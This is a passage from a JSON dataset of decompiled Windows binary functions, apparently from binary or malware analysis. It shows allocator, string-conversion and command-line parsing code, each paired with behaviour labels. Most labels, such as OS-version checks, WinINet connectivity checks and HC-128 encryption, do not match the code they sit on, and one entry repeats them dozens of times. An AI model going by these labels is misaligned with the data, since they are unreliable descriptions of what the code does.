uVar12;\n        }\n        iVar13 = uVar12 * 8;\n        ppuVar10 = *(iVar13 + 0x4937a8);\n        piVar1 = ppuVar10[1];\n        *(iVar13 + 0x4937a8) = piVar1;\n        *piVar1 = iVar13 + 0x4937a4;\n        if (iVar13 + 0x4937a4 == piVar1) {\n            uVar7 = uVar12 & 0x1f;\n            puVar4 = uVar14 * 4 + 0x493724;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar14 >> 3) + 0x493720;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar14 & 7));\n            }\n        }\n        uVar15 = (ppuVar10[-1] & 0xfffffff0) - uVar18;\n        if (uVar15 == 0) {\n            puVar3 = ((ppuVar10[-1] & 0xfffffff0) - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            *(ppuVar10 + uVar17 + 0x2c) = uVar15 + 3;\n            *(ppuVar10 + (uVar15 - 8) + uVar18) = uVar15;\n            if (0xb2f < uVar15) {\n                fcn.004015d4();\n            }\n        }\n        ppuVar10[-1] = uVar17 + 0x32;\n        *0x493714 = 0;\n        return ppuVar10;\n    }\n    iVar13 = *((in_EAX + 3 >> 3) + 0x4935bc) * 8;\n    puVar3 = iVar13 + 0x490040;\n    puVar16 = puVar3;\n    if (*0x493049 != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar7 = *puVar3;\n            *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n            puVar16 = puVar3;\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x490060;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x490080;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            sub.kernel32.dll_Sleep(0);\n            LOCK();\n            uVar7 = *puVar3;\n            *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n            puVar16 = puVar3;\n            if (uVar7 == 0) break;\n            sub.kernel32.dll_Sleep();\n        }\n    }\n    puVar3 = *(puVar16 + 4);\n    ppuVar10 = *(puVar3 + 8);\n    if (puVar3 != puVar16) {\n        *(puVar3 + 0xc) = *(puVar3 + 0xc) + 1;\n        puVar6 = ppuVar10[-1];\n        *(puVar3 + 8) = puVar6 & 0xfffffff8;\n        ppuVar10[-1] = puVar3;\n        if ((puVar6 & 0xfffffff8) != 0) {\n            *puVar16 = 0;\n            return ppuVar10;\n        }\n        iVar13 = *(puVar3 + 4);\n        *(iVar13 + 0x14) = puVar16;\n        *(puVar16 + 4) = iVar13;\n        *puVar16 = 0;\n        return ppuVar10;\n    }\n    puVar3 = *(puVar16 + 0x10);\n    uVar5 = *(puVar16 + 2);\n    if (ppuVar10 < *(puVar16 + 0xc) || ppuVar10 == *(puVar16 + 0xc)) {\n        piVar1 = puVar3 + 0xc;\n        *piVar1 = *piVar1 + 1;\n        *(puVar16 + 8) = uVar5 + ppuVar10;\n        *puVar16 = 0;\n        ppuVar10[-1] = puVar3;\n        return ppuVar10;\n    }\n    if (*0x493049 != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar19 = *0x493714 == 0;\n            *0x493714 = *0x493714 ^ bVar19 * (*0x493714 ^ 1);\n            if (bVar19) break;\n            sub.kernel32.dll_Sleep();\n            LOCK();\n            bVar19 = *0x493714 == 0;\n            *0x493714 = *0x493714 ^ bVar19 * (*0x493714 ^ 1);\n            if (bVar19) break;\n            sub.kernel32.dll_Sleep();\n        }\n    }\n    uVar17 = puVar16[1] & *0x493720;\n    if (uVar17 == 0) {\n        if (*0x49371c < *(puVar16 + 0x18)) {\n            uVar17 = *(puVar16 + 0x1a);\n            ppuVar10 = fcn.004016a0();\n            if (ppuVar10 == NULL) {\n                *0x493714 = 0;\n                *puVar16 = 0;\n                return NULL;\n            }\n        }\n        else {\n            uVar17 = *0x49371c;\n            if (*(puVar16 + 0x1a) + 0xb30 <= *0x49371c) {\n                uVar17 = *(puVar16 + 0x1a);\n            }\n            ppuVar10 = *0x493718 - uVar17;\n            *0x49371c = *0x49371c - uVar17;\n            *0x493718 = ppuVar10;\n        }\n    }\n    else {\n        uVar18 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> uVar18 & 1) == 0; uVar18 = uVar18 + 1) {\n            }\n        }\n        uVar17 = *(uVar18 * 4 + 0x493724);\n        iVar13 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> iVar13 & 1) == 0; iVar13 = iVar13 + 1) {\n            }\n        }\n        iVar13 = iVar13 + uVar18 * 0x20;\n        iVar2 = iVar13 * 8;\n        ppuVar10 = *(iVar2 + 0x4937a8);\n        piVar1 = ppuVar10[1];\n        *(iVar2 + 0x4937a8) = piVar1;\n        *piVar1 = iVar2 + 0x4937a4;\n        if (iVar2 + 0x4937a4 == piVar1) {\n            uVar7 = iVar13 & 0x1f;\n            puVar4 = uVar18 * 4 + 0x493724;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar18 >> 3) + 0x493720;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar18 & 7));\n            }\n        }\n        uVar17 = ppuVar10[-1] & 0xfffffff0;\n        if (uVar17 < 0x10a60) {\n            puVar3 = (uVar17 - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            uVar18 = *(puVar16 + 0x1a);\n            iVar13 = uVar17 - uVar18;\n            *(ppuVar10 + (uVar18 - 4)) = iVar13 + 3;\n            *(ppuVar10 + iVar13 + -8 + uVar18) = iVar13;\n            fcn.004015d4();\n            uVar17 = uVar18;\n        }\n    }\n    ppuVar10[-1] = uVar17 + 6;\n    *0x493714 = 0;\n    *ppuVar10 = puVar16;\n    ppuVar10[2] = NULL;\n    ppuVar10[3] = 0x1;\n    *(puVar16 + 0x10) = ppuVar10;\n    *(puVar16 + 8) = *(puVar16 + 2) + ppuVar10 + 8;\n    *(puVar16 + 0xc) = ppuVar10 + (uVar17 - *(puVar16 + 2));\n    *puVar16 = 0;\n    ppuVar10[7] = ppuVar10;\n    return ppuVar10 + 8;\n}\n",
        "token_count": 3253
    },
    "004039e4": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004039e4(uchar *param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    \n    uVar6 = in_EAX & 0xff;\n    param_2 = param_2 & 0xff;\n    uVar5 = in_EAX >> 8 & 0xff;\n    for (uVar3 = uVar5; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *param_1 = 0;\n        param_1 = param_1 + 1;\n    }\n    if (uVar5 * 8 <= param_2) {\n        param_2 = uVar5 * 8 - 1;\n    }\n    if (uVar6 <= param_2) {\n        uVar1 = -1 << (uVar6 & 7);\n        uVar2 = 0xff >> (~param_2 & 7);\n        puVar7 = param_1 + ((uVar6 >> 3) - uVar5);\n        iVar4 = (param_2 >> 3) - (uVar6 >> 3);\n        if (iVar4 == 0) {\n            *puVar7 = uVar1 & uVar2;\n        }\n        else {\n            *puVar7 = uVar1;\n            while( true ) {\n                puVar7 = puVar7 + 1;\n                iVar4 = iVar4 + -1;\n                if (iVar4 == 0) break;\n                *puVar7 = 0xff;\n            }\n            *puVar7 = uVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 414
    },
    "00401634": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00401634(void)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar5 = *0x493718;\n    if (*0x49371c == 0) {\n        return;\n    }\n    if ((*(*0x493718 + -4) & 1) == 0) {\n        *(*0x493718 + -4) = *(*0x493718 + -4) | 8;\n        piVar3 = iVar5 - *0x49371c;\n        uVar4 = *0x49371c;\n    }\n    else {\n        uVar4 = *(*0x493718 + -4) & 0xfffffff0;\n        if (0xb2f < uVar4) {\n            fcn.00401594();\n            uVar4 = *(*0x493718 + -4) & 0xfffffff0;\n        }\n        piVar3 = *0x493718 - *0x49371c;\n        uVar4 = uVar4 + *0x49371c;\n    }\n    piVar3[-1] = uVar4 + 3;\n    *((uVar4 - 8) + piVar3) = uVar4;\n    if (uVar4 < 0xb30) {\n        return;\n    }\n    uVar4 = uVar4 - 0xb30 >> 8;\n    iVar5 = (uVar4 - 0x3ff & -(uVar4 < 0x3ff)) + 0x3ff;\n    uVar4 = iVar5 * 8;\n    ppiVar2 = *(uVar4 + 0x4937a8);\n    *piVar3 = uVar4 + 0x4937a4;\n    piVar3[1] = ppiVar2;\n    *ppiVar2 = piVar3;\n    *(uVar4 + 0x4937a8) = piVar3;\n    if (ppiVar2 != uVar4 + 0x4937a4) {\n        return;\n    }\n    uVar4 = uVar4 >> 8 & 0xff;\n    puVar1 = uVar4 * 4 + 0x493724;\n    *puVar1 = *puVar1 | 1 << (iVar5 & 0x1f);\n    *0x493720 = *0x493720 | 1 << (uVar4 & 0x1f);\n    return;\n}\n",
        "token_count": 566
    },
    "00401718": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401718(void)\n\n{\n    char cVar1;\n    \n    if (*0x493049 != '\\0') {\n        while (cVar1 = fcn.00401408(),  cVar1 != '\\0') {\n            sub.kernel32.dll_Sleep(0);\n            cVar1 = fcn.00401408();\n            if (cVar1 == '\\0') {\n                return;\n            }\n            sub.kernel32.dll_Sleep();\n        }\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00401b60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.00401b60(void)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t **in_EAX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint8_t **ppuVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    bool bVar8;\n    uint8_t **ppuVar9;\n    uint8_t **ppuVar10;\n    \n    ppuVar9 = in_EAX[-1];\n    if ((ppuVar9 & 7) != 0) {\n        if ((ppuVar9 & 5) != 0) {\n            if ((ppuVar9 & 3) != 0) {\n                return -1;\n            }\n            fcn.00401718();\n            puVar7 = in_EAX[-4];\n            ppuVar9 = in_EAX[-3];\n            iVar4 = sub.kernel32.dll_VirtualFree(in_EAX + -4, 0, 0x8000);\n            if (iVar4 == 0) {\n                iVar4 = -1;\n            }\n            else {\n                *ppuVar9 = puVar7;\n                *(puVar7 + 4) = ppuVar9;\n                iVar4 = 0;\n            }\n            *0x4957a4 = 0;\n            return iVar4;\n        }\n        goto code_r0x00401c49;\n    }\n    puVar7 = *ppuVar9;\n    ppuVar5 = in_EAX;\n    if (*0x493049 != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar1 = *puVar7;\n            *puVar7 = *puVar7 ^ (uVar1 == 0) * (*puVar7 ^ 1);\n            ppuVar5 = in_EAX;\n            if (uVar1 == 0) break;\n            ppuVar10 = NULL;\n            ppuVar5 = ppuVar9;\n            sub.kernel32.dll_Sleep(0, ppuVar9, in_EAX);\n            LOCK();\n            uVar1 = *puVar7;\n            *puVar7 = *puVar7 ^ (uVar1 == 0) * (*puVar7 ^ 1);\n            ppuVar9 = ppuVar10;\n            if (uVar1 == 0) break;\n            ppuVar9 = 0xa;\n            in_EAX = ppuVar10;\n            sub.kernel32.dll_Sleep(10, ppuVar10, ppuVar5);\n        }\n    }\n    in_EAX = ppuVar9;\n    ppuVar9 = in_EAX + 3;\n    *ppuVar9 = *ppuVar9 + -1;\n    puVar3 = in_EAX[2];\n    if (*ppuVar9 != NULL) {\n        in_EAX[2] = ppuVar5;\n        ppuVar5[-1] = puVar3 + 1;\n        if (puVar3 != NULL) {\n            *puVar7 = 0;\n            return 0;\n        }\n        puVar3 = *(puVar7 + 4);\n        in_EAX[5] = puVar7;\n        in_EAX[1] = puVar3;\n        *(puVar3 + 0x14) = in_EAX;\n        *(puVar7 + 4) = in_EAX;\n        *puVar7 = 0;\n        return 0;\n    }\n    if (puVar3 == NULL) {\ncode_r0x00401bc7:\n        *(puVar7 + 0xc) = puVar3;\n    }\n    else {\n        puVar3 = in_EAX[5];\n        puVar2 = in_EAX[1];\n        *(puVar3 + 4) = puVar2;\n        *(puVar2 + 0x14) = puVar3;\n        puVar3 = NULL;\n        if (*(puVar7 + 0x10) == in_EAX) goto code_r0x00401bc7;\n    }\n    *puVar7 = puVar3;\n    ppuVar9 = in_EAX[-1];\ncode_r0x00401c49:\n    puVar7 = ppuVar9 & 0xfffffff0;\n    if (*0x493049 != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar8 = *0x493714 == 0;\n            *0x493714 = *0x493714 ^ bVar8 * (*0x493714 ^ 1);\n            if (bVar8) break;\n            sub.kernel32.dll_Sleep();\n            LOCK();\n            bVar8 = *0x493714 == 0;\n            *0x493714 = *0x493714 ^ bVar8 * (*0x493714 ^ 1);\n            if (bVar8) break;\n            sub.kernel32.dll_Sleep();\n        }\n    }\n    if ((*(puVar7 + -4 + in_EAX) & 1) == 0) {\n        *(puVar7 + -4 + in_EAX) = *(puVar7 + -4 + in_EAX) | 8;\n    }\n    else {\n        uVar6 = *(puVar7 + -4 + in_EAX) & 0xfffffff0;\n        puVar7 = puVar7 + uVar6;\n        if (0xb2f < uVar6) {\n            fcn.00401594();\n        }\n    }\n    if ((*(in_EAX + -1) & 8) != 0) {\n        puVar3 = in_EAX[-2];\n        in_EAX = in_EAX - puVar3;\n        puVar7 = puVar7 + puVar3;\n        if (0xb2f < puVar3) {\n            fcn.00401594();\n        }\n    }\n    if (puVar7 != 0x13fff0) {\n        in_EAX[-1] = puVar7 + 3;\n        *(puVar7 + -8 + in_EAX) = puVar7;\n        fcn.004015d4();\n        *0x493714 = 0;\n        return 0;\n    }\n    if (*0x49371c == 0x13fff0) {\n        puVar7 = in_EAX[-4];\n        ppuVar9 = in_EAX[-3];\n        *(puVar7 + 4) = ppuVar9;\n        *ppuVar9 = puVar7;\n        *0x493714 = 0;\n        iVar4 = sub.kernel32.dll_VirtualFree(in_EAX + -4, 0, 0x8000);\n        return -(iVar4 == 0);\n    }\n    fcn.00401634();\n    in_EAX[0x4fffb] = 0x2;\n    *0x493714 = 0;\n    *0x493718 = in_EAX + 0x4fffc;\n    *0x49371c = 0x13fff0;\n    return 0;\n}\n",
        "token_count": 1561
    },
    "0040211c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0040211c(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    if (((*0x49371c != 0) && (in_EAX <= *0x493718)) && (*0x493718 <= in_EAX + 0x140000)) {\n        uVar1 = *0x493718;\n        if (*0x49371c == 0x13fff0) {\n            uVar1 = 0;\n        }\n        return uVar1;\n    }\n    return in_EAX + 0x10;\n}\n",
        "token_count": 132
    },
    "00402198": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402198(uint param_1, uint8_t *param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    iVar1 = (in_EAX + 1) * 0x89705f41;\n    uVar3 = iVar1 >> 0x20;\n    uVar2 = uVar3 >> 0x1d;\n    uVar4 = (uVar3 & 0x1fffffff) * 5 + (iVar1 >> 0x1e);\n    *param_2 = iVar1 >> 0x3d | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar2 = uVar2 | uVar4 >> 0x1c;\n    *param_2 = uVar4 >> 0x1c | 0x30;\n    uVar3 = (uVar4 & 0xfffffff) * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = (uVar4 & 0xfffffff) * 5 & 0x7ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1b;\n    *param_2 = uVar3 >> 0x1b | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x3ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1a;\n    *param_2 = uVar3 >> 0x1a | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x1ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x19;\n    *param_2 = uVar3 >> 0x19 | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0xffffff;\n    uVar2 = uVar2 | uVar3 >> 0x18;\n    *param_2 = uVar3 >> 0x18 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x17;\n    uVar4 = uVar4 * 5 & 0x7fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x16;\n    uVar4 = uVar4 * 5 & 0x3fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x15;\n    *param_2 = uVar3 | 0x30;\n    param_2[(uVar2 | uVar3) != 0] = (uVar4 * 5 & 0x1fffff) * 5 >> 0x14 | 0x30;\n    return param_2 + ((uVar2 | uVar3) != 0) + 1;\n}\n",
        "token_count": 861
    },
    "004023b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.004023b4(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (*0x493049 != '\\0') {\n        while (in_EAX = fcn.00401408(),  in_EAX != '\\0') {\n            sub.kernel32.dll_Sleep();\n            in_EAX = fcn.00401408();\n            if (in_EAX == '\\0') break;\n            sub.kernel32.dll_Sleep();\n        }\n    }\n    if (*0x4957b8 == 0) {\n        in_EAX = sub.kernel32.dll_VirtualAlloc(0, 0x10000, 0x1000, 4);\n        *0x4957b8 = in_EAX;\n    }\n    return in_EAX & 0xffffff00 | *0x4957b8 != 0;\n}\n",
        "token_count": 184
    },
    "00402460": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00402460(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    if (*0x4957b8 != NULL) {\n        cVar1 = fcn.004023b4();\n        if (cVar1 != '\\0') {\n            iVar3 = **0x4957b8;\n            if (-1 < iVar3 + -1) {\n                iVar2 = 0;\n                do {\n                    if (in_EAX == (*0x4957b8)[iVar2 + 1]) {\n                        (*0x4957b8)[iVar2 + 1] = (*0x4957b8)[**0x4957b8];\n                        **0x4957b8 = **0x4957b8 + -1;\n                        uVar4 = 1;\n                        break;\n                    }\n                    iVar2 = iVar2 + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            *0x4957bc = 0;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 266
    },
    "00402c78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00402c78(void)\n\n{\n    if (*0x4957c0 != 0) {\n        sub.user32.dll_DestroyWindow(*0x4957c0);\n        *0x4957c0 = 0;\n    }\n    if (*0x4935b0 != '\\0') {\n        fcn.00402604();\n    }\n    if (*0x4957b8 != 0) {\n        sub.kernel32.dll_VirtualFree(*0x4957b8, 0, 0x8000);\n        *0x4957b8 = 0;\n    }\n    fcn.00402be8();\n    return;\n}\n",
        "token_count": 145
    },
    "00402e34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00402e34(void)\n\n{\n    uint8_t in_AL;\n    \n    if (*0x493008 != NULL) {\n        (**0x493008)();\n    }\n    if ((in_AL & 0x7f) == 0) {\n        fcn.00406b88();\n    }\n    fcn.00402ddc();\n    return;\n}\n",
        "token_count": 81
    },
    "00402d68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00402d68(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00406b88();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.00406b88();\n        return *(*piVar1 + 8);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "00402e40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e15)\n// WARNING: Removing unreachable block (ram,0x00402e1a)\n\nvoid __fastcall fcn.00402e40(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406b88(param_1, param_2);\n    if (*(iVar1 + 4) != 0) {\n        if (*0x493008 != NULL) {\n            (**0x493008)();\n        }\n        fcn.00406b88();\n        fcn.00402ddc();\n        return;\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "00402fe0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00402fe0(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint8_t *puStack20;\n    \n    while( true ) {\n        while ((*in_EAX != 0 && (*in_EAX < 0x21))) {\n            in_EAX = sub.user32.dll_CharNextA();\n        }\n        puStack20 = in_EAX;\n        if ((*in_EAX != 0x22) || (in_EAX[1] != 0x22)) break;\n        in_EAX = in_EAX + 2;\n    }\n    while (puVar3 = in_EAX,  0x20 < *puVar3) {\n        if (*puVar3 == 0x22) {\n            puVar2 = sub.user32.dll_CharNextA(puVar3);\n            while ((puVar5 = puVar2,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar2 = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n            in_EAX = puVar5;\n            if (*puVar5 != 0) {\n                in_EAX = sub.user32.dll_CharNextA(puVar3);\n   